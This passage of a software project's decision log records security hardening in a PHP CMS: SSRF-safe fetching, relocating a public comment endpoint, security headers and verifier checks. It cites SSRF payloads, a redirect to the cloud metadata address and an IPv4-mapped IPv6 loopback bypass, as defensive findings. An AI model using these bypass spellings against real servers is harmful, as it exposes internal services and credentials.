- Why the class is a FETCHER and not just a validator, which is the load-bearing part: pre-flight validation is necessary and **not sufficient**. A public host that passes the check can answer `302 Location: http://169.254.169.254/`, and both cURL's `CURLOPT_FOLLOWLOCATION` and PHP's http wrapper follow it without consulting anyone. **Measured, not assumed:** `CURLOPT_REDIR_PROTOCOLS` is set **nowhere** in this repository, the four `stream_context_create` fetch sites set no `max_redirects` and therefore inherit PHP's default of **20**, and only one call site in the entire product (`PageFetcher::fetch()`) re-validated after a redirect at all — and that one checks only the FINAL url, after the body has already been fetched. So a validated call site was still one attacker-controlled redirect away from the metadata endpoint. SafeHttp turns the transport's redirect handling off and walks the chain itself, re-validating every hop, with method/body following RFC 9110 §15.4 so callers keep the behaviour they had.
- The finding was WIDER than the audit recorded, and this is the part worth carrying forward: S-08 described one arbitrary fetch (`discoverOembed( $url )`). Reading the file for the fix found a **second** one — the endpoint *discovered inside* the fetched page (`<link type="application/json+oembed" href="...">`) is equally attacker-controlled, and unlike the page fetch **its response is echoed back to the caller** (whole on success, first 500 bytes on a JSON parse failure). That is a full read-SSRF primitive, and validating only the caller-supplied URL would have left it open. Every fetch in the file now goes through one function for that reason.
- Refusals answer as the generic failure, never as an oracle: `oembed.php` returns the same `400 Invalid URL` for a refused private address as for a malformed one. A distinct reply per reason would turn an authenticated editor into an internal-network scanner, one address per request. The specific reason goes to `error_log()` and the `http.safe.blocked` action.
- Why `klytos_http_get()` was NOT made safe by default: it would refuse any plugin legitimately calling a LAN or localhost service — a breaking change for third parties, which in this project needs its own decision and release note (the D-034 precedent), not a quiet inclusion in a security slice. Plugin authors fetching untrusted URLs call `klytos_safe_http()`; the reference doc says so in those words.
- Extension points, with the risk stated rather than buried: `http.safe.allowed_schemes` and `http.safe.max_redirects` (filters) **can** weaken a shipped control, exactly as `admin.gate_map` can (D-032) — both are plugin-trust boundaries and plugins already run as first-party code here. What neither can do is open a hole by omission, since the default is an allow-list. `http.safe.blocked` is an **action, not a filter**: a listener able to turn a refusal into a grant would put SSRF policy back in third-party hands, which is the same reasoning that shaped `auth.access_denied`.
- Fixed in-path, per D-031's narrowing: `HttpClient::requestWithStream()` accepted `follow_redirects` at `request()` and then **dropped it**, hardcoding `follow_location => 1`. A caller that switched redirects off got them anyway whenever `ext-curl` was absent — which would have handed back the exact SSRF SafeHttp exists to prevent, on precisely the hosts least likely to notice. The slice was already changing this transport; leaving it would have shipped a control with a documented bypass.
- Second known limit, found by reading the transport rather than by testing it, and documented rather than closed: `HttpClient::request()` applies the `http.before_request` filter to the method, URL and options at `http-client.php:91` — **after** `SafeHttp` has validated. A plugin listening there can substitute a private address post-check. This is the same plugin-trust boundary as `admin.gate_map` (D-032), so it is consistent with how this project already treats plugin code, but it is named explicitly in `docs/reference/safe-http.md` because — unlike `http.safe.allowed_schemes` — it is not a hook anyone would expect to be a security surface. Moving the validation below the filter was considered and rejected for this slice: it would mean `SafeHttp` reaching past `HttpClient`'s public API into its transport methods, which trades a documented plugin-trust issue for a structural coupling, and the filter predates this slice.
- Known limit, recorded as **NEW-15** and stated in the reference doc rather than implied away: DNS rebinding survives. The host is resolved to validate and resolved again to connect. Closing it means pinning the validated address (`CURLOPT_RESOLVE`), which changes `HttpClient`'s contract for every caller and needs a resolver the test can control. **Slice 6 raises the cost of SSRF substantially; it does not make it impossible**, and saying otherwise would be the L-002 defect verbatim.
- Alternatives rejected (and why): **validate at the oEmbed call site only** (closes the named finding with the smallest diff — but leaves the AI-reachable webhook URL behind `FILTER_VALIDATE_URL`, leaves two copies of the check, and leaves the discovered-endpoint fetch open); **make `HttpClient` refuse private addresses for everyone** (widest coverage, and the right long-term end state — but it is a breaking change for third-party plugins landing inside a security slice, which is the tangling D-025/D-026/D-029/D-031 have each refused in turn); **keep `CURLOPT_FOLLOWLOCATION` and re-validate only the final URL** (what `PageFetcher` does today — cheapest, and unsound: the body has already been fetched from the internal host by the time the check runs, and intermediate hops are never seen at all).
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff and between them, plus one finding neither produced, the slice grew materially. Recorded here rather than silently folded in, because the shape of what they caught is the transferable part:
  - **A live bypass in the new class, found by testing rather than by either reviewer.** `filter_var`'s reserved-range flags do not understand IPv4-mapped IPv6, so `http://[::ffff:127.0.0.1]/` was ALLOWED and verified to fetch loopback for real (HTTP 200, body returned). Every private address has such a spelling. `isReservedAddress()` now normalizes IPv4-mapped and IPv4-compatible IPv6 to dotted-quad on the packed bytes before classifying. The `security-auditor` raised the case and reasoned past it — "very likely already handled correctly" — which is why **L-013** exists: a reviewer's reassurance is a hypothesis exactly like a reviewer's accusation.
  - **A dual-stack gap:** `gethostbynamel()` reads A records only while the transport is dual-stack, so a public A plus a private AAAA passed. `resolveHost()` now reads AAAA too and every returned address must pass. No rebinding trick needed for this one — two DNS records.
  - **The same file had a second, unfixed untrusted fetch.** `integrity-checker.php::httpGet()` takes its URL from `resolvePluginManifestUrl()`, i.e. an external plugin's `Integrity URL` header — the *same* untrusted plugin file, parsed by the *same* parser, as the `Integrity Key URL` this decision originally fixed. It had raw cURL, `FOLLOWLOCATION`, and no address check at all. Fixing one of two identical paths in one file is precisely the failure this class exists to end, and the first draft of this decision did exactly that.
  - **The importer's three fetchers were converted after all**, reversing this decision's original scope. `PageFetcher::fetch()`, `PageFetcher::fetchRobotsTxt()`, `MediaDownloader::downloadFile()` and `SitemapParser::fetchXml()` now call `fetch()` rather than validating through `ImportValidator` and then issuing their own `CURLOPT_FOLLOWLOCATION` request. The original draft left them, and both reviewers called that blocking with the same argument: the audit's own S-08 text names them, and this decision's "alternatives rejected" list cites `PageFetcher` **by name** as the unsound pattern while shipping it unchanged. `MediaDownloader` was the worst of them — it never re-checked the destination even once, so a redirect into the internal network wrote that response to disk as a servable "media asset". `docs/reference/safe-http.md` had also claimed these paths were covered, which was the L-002 defect in a document written in the same slice that warns about it.
  - **A new oracle was introduced and removed.** `WebhookManager::create()` initially threw a distinct message for a blocked address versus a malformed URL — reachable from the MCP tool `klytos_create_webhook`, which per NEW-02/D-020 has **no permission check** until Sprint 2, and echoed into the page by `admin/webhooks.php`. That is the scanner this slice deliberately avoided building in `oembed.php`, built in the same slice, three files away. Both messages are now identical.
  - Smaller, all confirmed against source before acting: `update()` gained the same check as `create()` (no caller today — which is exactly why); `absolutize()` now handles a query-only `Location` per RFC 3986 §5.3 and normalizes dot segments; the `http.safe.redirect` docblock no longer claims the hop was followed; and `IntegrationTestCase::tearDown()` runs the hook check **before** the config check, because a throwing config assertion would otherwise stop the hook check from ever running — L-010's masking shape one level removed.
- Supersedes: none. Closes audit **S-08**; opens **NEW-15**.

## D-042 — The integration tier records a hook baseline and fails a test that leaks one
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 6
- Decision: `IntegrationTestCase` captures `Hooks::getRegisteredHooks()` after `App::boot()` and asserts in `tearDown()` that the test handed it back unchanged. Throwaway listeners are registered with new `addTemporaryFilter()` / `addTemporaryAction()` helpers, which remove them by **callback identity**; a test using the raw `klytos_add_filter()` / `klytos_add_action()` and leaving a listener behind now FAILS with an explicit message.
- What was wrong: `UnitTestCase` calls `Hooks::reset()` before and after every test. The integration tier called it **never**. `Hooks` is static and `App::boot()` runs once per process, so any listener a test registered persisted for every test that ran afterwards in the same process.
- Why nobody had noticed, which is the transferable part: **no integration test had ever registered a hook.** The tier had been in use since slice 1 and the gap was invisible because nothing exercised it. Slice 6 is the first — its `http.safe.allowed_schemes` test permits `ftp://`, and that filter was silently permitting `ftp://` for every test that followed it. Caught by reading the tier's own refusal logs and noticing a later test reported `too_many_redirects` where `private_or_reserved_address` was expected: the *reason* was wrong, and the reason is exactly what the slice's tests assert on for this purpose.
- Nothing was passing for the wrong reason **yet**, and that is stated precisely rather than inflated: the affected assertions still held. But the next security test to register a weakening filter would have leaked it into everything downstream, and it would have looked exactly like a green suite — which is L-010's failure mode, one slice after L-010 was written.
- Why a baseline and not `Hooks::reset()`: a blanket reset would strip the core and plugin hooks `App::boot()` registered, for every test after the first, leaving the application quietly half-wired. The baseline is taken *after* boot, so it means "the application's own hooks" rather than "no hooks".
- Why removal is by callback identity and not `removeAllFilters( $hook )`: a test that hooks a name the application also uses must not take the application's listeners down with its own on the way out.
- Proven in both directions before being trusted, per **L-010** — one direction is half a test: a throwaway probe test that leaked a filter through the raw API **FAILED** with the intended message, and a sibling test using `addTemporaryFilter()` **PASSED** in the same run. The probe was then deleted. Evidence in `docs/05-test-points.md`.
- Alternatives rejected (and why): **per-test cleanup discipline** (no infrastructure, and it is the exact "everyone must remember" failure mode S-07 exists to close — file 67 forgets); **`Hooks::reset()` plus re-boot per test** (perfectly isolated, but `App::boot()` is not cheap and the tier's whole design is one boot per process, per D-030); **snapshot and restore the full registry by reflection** (most complete, but it couples the harness to private static internals with no compiler to catch a rename — the objection D-030 already recorded against reflection on `App::$instance`).
- Supersedes: none. Extends the isolation contract D-030 established for storage to cover hook state, which D-030 did not consider.

## D-043 — The public comment handler moves OUT of the admin tree instead of being exempted from its guard
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 7 (user decision on the scope question)
- Decision: Audit **S-09** is closed by **relocating** the handler, not by the remediation the audit recorded. `installer/admin/api/comment-submit.php` is **deleted** and its gate-map entry removed; the handler becomes `installer/public/comment-submit.php`, which `BuildEngine::syncCommentEndpoint()` copies to the site's **web root** so the public URL is `/comment-submit.php`. `admin/bootstrap.php`'s `$preAuthScripts` list is **not** touched. The per-session rate limit is replaced with the product's existing persistent, IP-keyed `Klytos\Core\MCP\RateLimiter`. Input bounds are added to `CommentManager::submit()`. Slice scope stops at the endpoint and its route: **no comment form is built**.
- Why the recorded remediation was rejected, verified against source rather than argued: adding the file to `$preAuthScripts` fails this slice's own test point and opens a surface nobody asked for.
  - **The URL.** The admin directory is renamed to a randomized `<hex>-admin` at install (`install.php:811-824`) and `Helpers::getBasePath()` states the name "must NEVER appear in public URLs" (`core/helpers.php:192-197`); the root `.htaccess` header says the same. A form on a generated page has to post *somewhere*, and posting to the old location would print the secret directory name onto every page of every site. Criterion 4 of the test point is exactly this.
  - **What the exemption would have PERMITTED — the D-036 question, asked this time.** `admin/bootstrap.php` runs the cron manager and the action scheduler on **every** request (`bootstrap.php:184-196`). Exempting an anonymous endpoint from the auth guard therefore hands every passer-by a scheduler trigger, on top of the comment box. `installer/index.php` does neither (`index.php:62`), and the relocated handler does neither. D-036 recorded that the webauthn diagnosis "identified the redirect and stopped, without asking what the endpoint would then permit"; this is that question answered before acting, and the answer changed the design.
- Why the web root and not a route on the public front controller: there is **no rewrite from the web root into the application**. The root `.htaccess` serves static files and clean URLs only, and its own header says it "NEVER references the admin directory directly" — so adding one would contradict the file's stated invariant. A small PHP file at the web root that discovers the installation itself is the product's existing answer to this exact problem (`core/x402-bootstrap.php:265-267` does it for `public/x402-gate.php`). The *placement* was reused; its **bootstrap was not**, because `x402-gate.php` requires `core/bootstrap-minimal.php`, **a file that does not exist in this repository** — it falls through to `index.php`, which dispatches the router rather than returning. Copying that pattern would have copied a bug.
- Why the rate limit had to change, stated precisely because "per-session" undersells it: it was **not a weak rate limit, it was none.** `Auth::startSession()` scopes the session cookie to `path=<base>/admin/` with `SameSite=Strict` (`core/auth.php:52-62`), so a form on the generated static site can never send it back and `$_SESSION['last_comment_at']` is always absent. Verified live — every anonymous request received a brand-new `klytos_session`. `MCP\RateLimiter` was **reused** rather than extended: its window is a fixed 60 seconds, so the policy is expressed as 2 requests within it instead of the old "1 per 30 seconds", because inventing a second limiter to express the interval exactly is the duplication this project treats as a defect (the slice-4 and slice-6 precedent). `installer/public/x402-gate.php:20-46` already carries such a hand-rolled duplicate; it is left alone as an adjacent subsystem and noted, not forked a third time.
- Input bounds are part of the fix, not tidying: anonymous reach turns every unbounded field into a one-request arbitrary-size disk write. `author_name` 100, `author_email` 254, `page_slug` 200 — truncated **before** `sanitizeSlug()` runs, since transliterating a megabyte first would do the work the cap exists to prevent. `parent_id` must match this collection's own ID shape (32 hex — verified against `Helpers::randomHex( 16 )`, which is 16 *bytes*, and pinned by a test, because getting that length wrong would have silently flattened every threaded reply) or it is dropped rather than stored verbatim and echoed to later readers.
- **A deeper defect was uncovered while proving the fix, and fixed in path: NEW-16.** `SiteConfig::setValue()` **did not exist**, although `core/mcp/tools/comment-tools.php:136-148` calls it four times — so `klytos_set_comment_settings`, the only supported way to switch comments on, had fataled for its entire life. Its sibling `set()` could not substitute: a hardcoded allow-list of twelve top-level fields silently drops `comments_enabled`. Both halves are fixed. This is **in scope by necessity, not opportunism** — the test point requires an anonymous submission to succeed, which is unreachable while the feature cannot be enabled — and it is the L-009 shape once more: the first fault was standing in front of the second, and a slice that had only added the `$preAuthScripts` entry would have shipped, reviewed clean, and left comments exactly as broken.
- Recorded and NOT fixed, each with a trigger: **NEW-17** (behind a non-loopback proxy every visitor shares one rate-limit bucket, so the limit becomes a site-wide throttle — the remedy is trusted-proxy configuration, which changes `getClientIp()` for MCP and OAuth too); **NEW-18** (the global `__()` is declared only in `admin/bootstrap.php:28`, while `app.php:775-793` declares a *namespaced* one, so no public entry point can translate — which is why `t.php` and `x402-gate.php` hardcode English; the new endpoint calls the I18n **service** through a local closure instead of adding a third shim, and its strings are in all 20 catalogues); **NEW-19** (`RateLimiter` rewrites its whole file per request, a characteristic that only started mattering when an unauthenticated caller could reach it).
- Scope boundary, an explicit user decision rather than an omission: **no comment form is emitted into the generated site, and none ever was.** No template, part or build step produces one, and `CommentManager::renderCommentsHtml()` returns early on zero approved comments (`comment-manager.php:257-259`), so a first commenter would have had no entry point regardless. Form emission is bound to the theme-package sprint (D-023), which is already replacing the frontend template layer that would carry it. `docs/reference/public-comments.md` says this outright rather than implying the feature is complete — asserting otherwise would be the L-002 defect.
- Alternatives rejected (and why): **add to `$preAuthScripts` as recorded** (smallest diff and matches the audit text — but it fails criterion 4 by construction and grants anonymous scheduler triggers); **keep the file and add a public proxy route that forwards to it** (preserves the existing path — but it creates two entry points for one behaviour, the duplication this project treats as a defect, and the admin-path one still answers); **build the comment form in this slice too** (genuinely completes the feature end to end — but it lands new markup in exactly the layer D-023 is scheduled to replace, and the four test-point criteria are all properties of the endpoint and its path, provable without it).
- Supersedes: the `api/comment-submit.php` gate-map entry added in slice 4 (D-032), which recorded the authorization answer for a file that no longer exists. Closes audit **S-09**; opens **NEW-17**, **NEW-18**, **NEW-19**; closes **NEW-16** in the same slice.
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff; the `security-auditor` returned a finding that changed the design, and the `code-reviewer` returned six non-blocking items of which four were taken. Recorded here rather than folded in silently, because the shape of what they caught is the transferable part:
  - **The rate limit ran AFTER `App::boot()`, so the control that bounds abuse sat behind the expensive thing it was bounding.** `App::boot()` decrypts the config, builds ~25 managers and runs `PluginLoader::loadAll()`, executing every active plugin's `init.php` (`app.php:530-537`). Every check in the file needed a booted App, so an anonymous caller paid the full boot cost per request — at a **fixed, scannable URL present on every install**, where previously reaching that cost anonymously meant guessing the randomized admin directory. Restructured: a non-filterable flood ceiling (10/60s) now runs **before** boot, needing only `RateLimiter`'s directory path (`rate-limiter.php:35-38`) and `App::$dataPath`'s definition as `rootPath . '/data'` (`app.php:228`), with the class explicitly required because the autoloader only exists after boot — the same thing `t.php` does. The filterable policy limit (2/60s) then runs post-boot and derives its count from `getRemainingRequests()`, so it costs no second write. **This is the D-036 class of finding arriving anyway**: the URL question had been asked and answered, and a *different* consequence of making the surface public had not been.
  - **Worse, and entirely mine: the honeypot was checked BEFORE the rate limit**, so a flood that simply set `_honeypot` on every request took the cheap success branch and was **never counted**. The one control meant to bound repeated abuse did not engage for precisely the traffic it exists for. The honeypot now runs after the limiter, pinned by `testHoneypotSubmissionsAreRateLimitedToo`, proven to fail against the old ordering.
  - **The honeypot response was distinguishable from a success** — it answered `200` where a real submission answers `201`, while the code comment beside it claimed it responded "exactly as a success would". A bot comparing status codes once would have learned the field is a trap. It now answers `201` with a syntactically valid decoy id; the test asserts the shape matches AND that no such record exists.
  - **Three user-facing validation messages in `CommentManager::submit()` were hardcoded English** and are returned verbatim to anonymous callers through the endpoint's `400` branch. Now `__( 'comments.*' )` with keys in all 20 catalogues — verified live that `__()` resolves from inside `Klytos\Core` and returns the catalogue value, rather than assumed. The `405`/`500` paths keep literal strings by necessity: they fire before I18n exists (NEW-18).
  - **`installer/public/` was not in `phpcs.xml`'s scanned set at all**, so the D-025 baseline lock had never covered any public entry point — `x402-gate.php` had visible convention violations that lint had never reported. The directory is now scanned; its two pre-existing errors were auto-fixed, and it sits at 0/0.
  - **The JSON responder** does not call `Helpers::jsonResponse()` because two of its responses fire before `core/app.php` is required. Keeping one responder for the whole file beats two, but its flags now match (`JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES`) so an accented author name is not `\uXXXX`-escaped here and literal everywhere else.
  - **Escaping tightened in `renderThread()`** — `$date` printed as element text and the gravatar URL were unescaped. Verified NOT exploitable (both values are server-generated, `Helpers::now()` and an md5 hash) and pre-dating this slice, fixed anyway: the project's "escape at print time" rule has no exceptions, and a print site whose safety depends on an invariant three functions away is one refactor from being live.
  - **Deliberately NOT taken, with the reason recorded:** the ~10-line install-root discovery loop is duplicated between this endpoint and `x402-gate.php`. Extracting it into one helper is correct and is not done here, because the helper must load before boot and the second caller is the x402 surface — an adjacent subsystem under D-031's narrowing, whose own bootstrap is separately broken (it requires a `core/bootstrap-minimal.php` that does not exist). Naming it rather than half-extracting it; trigger is the next public entry point, which would make it three copies.
  - Findings from the same pass recorded and not fixed: **NEW-19** extended (identifier set grows monotonically; address rotation gets a bucket each) and **NEW-20** (`RateLimiter::check()` is a read-decide-write with no lock spanning it — carried as **plausible-and-unproven**, since neither the reviewer nor this slice ran the concurrency test that would settle it).

## D-044 — Security headers get ONE enforcement point, HSTS is HTTPS-only and subdomain-free, and the CSP fails closed
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 8 (HSTS policy and the page-editor scope question decided by the user)
- Decision: `Auth::sendSecurityHeaders()` is called **once**, from `installer/admin/bootstrap.php`, for every admin surface — the S-07 answer applied to headers. It gains `Strict-Transport-Security: max-age=31536000`, sent **only over TLS**, **without** `includeSubDomains`, filterable through `security.hsts`. Its CSP now **fails closed**: a caller supplying no nonce gets `script-src 'self'`, not the old `'self' 'unsafe-inline'`. The policy computation is split into a pure `Auth::buildSecurityHeaders()` so it can be tested at all. `Helpers::isHttps()` becomes the single HTTPS check, replacing four duplicated expressions.
- **Why one enforcement point rather than 25 calls** — this is NEW-14 and it is the S-07 shape exactly: the function had six call sites repo-wide and none was an admin API endpoint. Adding a call to each file has the identical failure mode one file later. Every admin file requires `admin/bootstrap.php` (verified mechanically this slice, not taken from slice 4's record: 73 PHP files under `admin/`, of which 9 are templates/partials/includes that are *included* rather than requested, leaving 64 entry points — the same 64 `scripts/keel-verify` counts).
- **The audit's own numbers were stale and its framing was wrong on two pages.** NEW-14 says "all 24 files in `installer/admin/api/`"; there are **23** — slice 7 deleted `comment-submit.php` (D-043). And it says "every admin PAGE gets them, because they all include `templates/header.php`", which is **false for five pages**: `bootstrap.php`, `login.php`, `logout.php`, `reset-password.php` and `setup-wizard.php` do not include it. Two of those called `sendSecurityHeaders()` themselves; **`login.php` and `logout.php` called nothing**. So the real gap was **25 surfaces including the login form**, not 24 JSON endpoints. Found by enumerating the pages rather than trusting the sentence — the L-014 discipline.
- **PLACEMENT IS THE LOAD-BEARING PART, and it is bounded on both sides.** Slice 7 established that a check placed after `App::boot()` is a cost an anonymous caller pays, and that a cheap branch before a limiter bypasses it; headers have the same shape, because *a header set after output has begun is not set at all*. The call sits immediately after the boot try/catch:
  - It cannot go **later**: everything below it in bootstrap emits or exits — the pending-rename redirect, the auth guard's 401 JSON and its 302, `klytos_deny()`'s 403 document, the setup-wizard redirect. All four are now covered, verified on real responses (the 401 and the 403 both carry `nosniff` on the wire).
  - It cannot go **earlier**: `App::boot()` **Step 1** is `registerAutoloader()` (`app.php:268`), so the `Auth` class does not resolve before boot, and `klytos_apply_filters()` does not exist until `app.php:331` requires `helpers-global.php` inside the same boot. **Probed, not inferred** — `class_exists( 'Klytos\Core\Auth', true )` returns NO both after `require app.php` and after `App::getInstance()`. This is L-006's rule applied before writing the line rather than after debugging it.
  - Consequence stated rather than left implied: the **boot-failure page** (which echoes an escaped exception message) and the two pre-boot redirects still send no headers, because the autoloader does not exist on those paths. Recorded as **NEW-22**.
- **Why HSTS is HTTPS-only and carries no `includeSubDomains`** (user decision, chosen over the stronger variant): a browser caches the directive for the full `max-age` and honours it after the header stops being sent, so it is close to irreversible for an installed base. `includeSubDomains` would force HTTPS onto every sibling subdomain of the install's host — subdomains that belong to the operator, not to Klytos, and that may legitimately serve plain HTTP. Klytos is self-hosted software; opting somebody else's infrastructure into a year-long, hard-to-undo directive by default is not ours to do. Operators who want preload or subdomains widen it through `security.hsts`. Sending it over cleartext was rejected as well: browsers ignore it there, so it would be a claim the transport cannot back.
- **Why the CSP fail-open mattered more than it looked, and this is the finding of the slice.** The old fallback meant a caller that forgot a nonce silently received the weakest policy in the product, with nothing to signal it. That is bad on its own. What made it load-bearing here is that **`login.php` had no CSP at all** and carries an inline `<script>` — the 2FA method switcher. Giving every surface a CSP therefore *would have broken two-factor login* had the fallback stayed weak enough to hide it, or had the block not been nonced. A security fix that breaks authentication is worse than the gap it closes; nonce-ing `login.php` is in scope **by necessity**, the same shape as NEW-16 in slice 7.
- **The public front controller is the exception, and it is stated at the call site instead of inherited.** `installer/index.php` now passes an **explicit** `$customCsp` that keeps `script-src 'unsafe-inline'`. This is not a lapse: `Router::dispatch()` `readfile()`s **pre-generated static HTML** (`router.php:303-326`), and the build engine writes inline `<script>` into it — the GDPR consent banner's `ConsentManager.init(...)` (`build-engine.php:881`) and a page's `custom_js` (`build-engine.php:444`). **A file generated once at build time cannot carry a per-request nonce.** Verified before deciding: failing closed there would have silently disabled the consent banner on every generated page of every site. Writing the policy out as a literal makes the weakening visible in a diff, which is precisely what the implicit fallback did not do. Recorded as **NEW-23**; the real fix belongs to the theme-package sprint (D-023), which owns generated output.
- **`style-src` keeps `'unsafe-inline'` deliberately, and a test asserts that weakness on purpose.** S-10 is explicitly out of scope (349 inline `style=` attributes across 40 files; an attribute cannot take a nonce). The trap that made this worth pinning: per CSP Level 3, adding a **nonce source** to `style-src` makes browsers **ignore** `'unsafe-inline'` — so "tidying" the policy by nonce-ing styles the way scripts are nonced would break the admin's rendering everywhere at once. The **10** `<style>` elements in `installer/admin/` now all carry nonce **attributes** that do nothing yet and are ready for the slice that removes `'unsafe-inline'` (4 already had them; 6 were added here). **The audit's "12" is wrong and is corrected in the same change**: it counted two `<style>` occurrences that are embedded inside `srcdoc` attributes (`blocks.php:82`, `block-data.php:172`), which build an iframe document as an escaped string and therefore cannot carry a nonce at all. Counting them made the S-10 estimate look larger than it is and would have sent the next slice hunting for two blocks that do not exist. `testStyleSrcStillAllowsInlineWhileS10IsOpen` exists so that removal is a deliberate act, not a side effect.
- **A false pass was caught in the slice's own test infrastructure, which is L-010 arriving for the third time.** The first unit tests drove `sendSecurityHeaders()` and read `headers_list()`. Under the **CLI SAPI `header()` is a no-op and `headers_list()` returns an empty array**, so all three "the header is ABSENT" assertions passed against an empty string — and would have passed against code that set no headers at all. They were caught only because the *presence* assertions in the same file failed loudly for the same underlying reason. The repair is the `buildSecurityHeaders()` split: the unit tier now asserts the **policy** and the integration tier asserts it **reaches the wire**. A second false pass was caught by probe in the integration tier: an assertion searching the whole response body for the nonce still passed with the nonce stripped from the `<script>` tag, because `login.php`'s `<style>` block carries one too.
- Alternatives rejected (and why): **add `sendSecurityHeaders()` to all 25 surfaces** (matches the audit's implicit shape and is closest to the existing code — but surface 26 forgets, which is the defect S-07 exists to end); **send the headers from `.htaccess`/the web server** (no nonce awareness at all, and the product supports a renameable install directory and multiple storage backends); **`includeSubDomains` now** (stronger, and rejected above on installed-base grounds); **fail the CSP closed everywhere including `index.php`** (uniform and simple, and it silently breaks the consent banner on every generated site — rejected on verified evidence, not on caution).
- Supersedes: none. Closes audit **S-11**, the **CSP fail-open**, and **NEW-14**; opens **NEW-21**, **NEW-22**, **NEW-23**.
- **Amended after the slice's own review cycle, before commit.** Both review subagents ran on the diff. Recorded here rather than folded in silently, because the shape of what they caught is the transferable part — and because one of the two headline findings was **stale rather than real**, which is itself the lesson:
  - **The `code-reviewer`'s single BLOCKING finding was REFUTED — it was reading a snapshot.** It reported that `docs/PROGRESS.md` still said "slices 0–7 closed / next is slice 8" while every other doc surface recorded the slice as done. Verified before acting: `PROGRESS.md` had already been updated, several minutes *before* the reviewer finished. The reviews were launched while the code was stable but the docs were still being written, so the agent read a mid-slice tree. **A review is a snapshot of the moment it read, not of the moment it reports** — and L-013's rule (verify the claim, do not act on it) is what stopped a "fix" that would have re-edited a correct file. The other reviewer, running in the same window, read `PROGRESS.md` after the edit and said nothing.
  - **The `security-auditor` found the slice's own subject sitting one directory outside its scope**, and this is the finding that matters: `installer/public/comment-submit.php` and `installer/public/x402-gate.php` send **no security headers at all**, not even `nosniff`. Both are anonymous, at fixed scannable URLs on every install — a more exposed position than the admin surfaces this slice just covered. Verified by grep rather than accepted: the only `header()` calls in either file are `Content-Type`, `Allow` and `Retry-After`. It is **NEW-14's own shape at file N+1**. Recorded as **NEW-24** and deliberately not fixed: neither file requires `admin/bootstrap.php` (that is the point of D-043's relocation), and `comment-submit.php` answers its flood ceiling **before** `App::boot()` by design, so a post-boot call would leave precisely that path uncovered — the NEW-22 shape again. What changed *in* this slice is the claim: `docs/reference/security-headers.md` now states in its own words that slice 8 covers the admin plus the front controller and **not** those two, because writing "every response carries headers" would have been the L-002 defect in a document created to prevent it.
  - **A count I introduced this slice was wrong, in the L-002 class, in text arguing against exactly that.** Both this decision and the new reference doc said "the 12 `<style>` blocks now carry nonce attributes". There are **10** in `installer/admin/`, all now nonced. The audit's S-10 figure of 12 counts two occurrences embedded in `srcdoc` attributes (`blocks.php:82`, `block-data.php:172`) that build an iframe document as an escaped string and **cannot carry a nonce at all**. Inherited without checking, and it would have sent the S-10 slice hunting for two blocks that do not exist. Corrected in both places and in the audit entry.
  - **Two unescaped nonce echoes**, `updates.php:379` and `:554`, printed `$cspNonce` raw where all eleven other nonce sites use `klytos_esc_attr()`. Not exploitable — the value is `base64_encode( random_bytes( 16 ) )` and carries no HTML metacharacters — and fixed anyway, for the reason D-043 already recorded: this project's escape-at-print-time rule has no exceptions, and a print site whose safety depends on an invariant three functions away is one refactor from being live. The sharper point is that `updates.php` was one of the 18 pages this slice's own CSP sweep marked "clean", so it was looked at and the inconsistency still was not seen — a conformance check answers the question it asks, not the one next to it.
  - **A duplicate survived in the file the slice was already editing.** `Helpers::isHttps()` was added to collapse the duplicated HTTPS expression, and `admin/bootstrap.php:195` still carried a copy ~65 lines below the new enforcement point. Converted. The remaining six copies live in files this slice does not open and are recorded as **NEW-25** rather than swept, per D-031's narrowing — they matter when the definition changes, which is exactly what trusted-proxy support (NEW-17) would do.
  - **The extension-point risk paragraph was missing**, breaking the pattern D-032 and D-041 both follow. Added to the reference doc, and it is worse than "weakenable": a plugin returning `max-age=0` from `security.hsts` does not merely suppress the header, it tells browsers to **forget a previously cached HSTS policy** — a rollback. The same section now states why nothing else is filterable (a CSP filter fails permissive by construction, unlike `admin.gate_map` where omission denies) and names the cost of that choice instead of leaving it implicit.
  - **Recorded and not fixed:** **NEW-26** — `reset-password.php`'s set-password form has no CSRF field or check. Pre-existing, exploitability genuinely low (a forged POST still needs the valid `user_id` + `token` pair, which is the secret CSRF would be substituting for), and it belongs to the authentication slice under D-031's narrowing. Noted because the file was in the diff and a reviewer looked at it; leaving it unrecorded would make the next reader find it again.
  - Confirmed sound by both reviewers against source, not merely read: the ordering (headers precede every emitting path below them), the nonce integrity (CSPRNG, one per request, no path where header and markup could diverge), the fail-closed CSP breaking no admin inline script, and the deliberate refusal to trust `X-Forwarded-Proto`.

## D-045 — keel-verify gains six checks and a WARN tier; two release-packaging defects are made detectable, not fixed
- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 9 (the INDEX scope, the WARN treatment, the CI matrix and the i18n check were all user decisions)
- Decision: `scripts/keel-verify` grows from 2 checks to **9**, covering the Phase 5 §1a promises that apply to this project. `docs/api/INDEX.md` gets a **verifier, not a regenerator**. A new **WARN** tier reports a genuinely-broken property whose fix is owned by another phase, printing full evidence without changing the exit code. `.github/workflows/ci.yml` runs the same commands the test points run, on PHP 8.2 and 8.3, with a syntax-only 8.1 job. All four permission allow-lists are written. `scripts/` enters the phpcs scan set with a fresh 0/2 baseline.
- **Why a verifier and not a regenerator (user decision).** INDEX.md was produced at adoption by bespoke mechanical extraction across 949 surfaces and has been hand-edited by every slice since. A regenerator that mis-extracts would *silently rewrite a correct file*, and the verifier would then pass because it agrees with the regenerator rather than with reality — a guard validating itself, which is L-010's failure mode with extra machinery. The verifier is cheap, fires only on real drift, and was green at birth for a **measured** reason: the eight Summary counts match their section row counts exactly (145/97/306/116/206/34/26/19, total 949).
- **Why two checks WARN instead of FAIL.** `docs/sprints/sprint-1.md` scopes H-01 (version touchpoints in four-way disagreement) to Phase 7 and this slice to making it *detectable*. A hard FAIL would turn keel-verify red for the whole sprint close and for every CI run, which trains people to ignore it — the exact mechanism that lets a check go inert. The WARN prints all five touchpoint values on every run. **The same treatment was extended to NEW-27** for consistency: the property is broken, the fix is Phase 7's, the evidence prints every time.
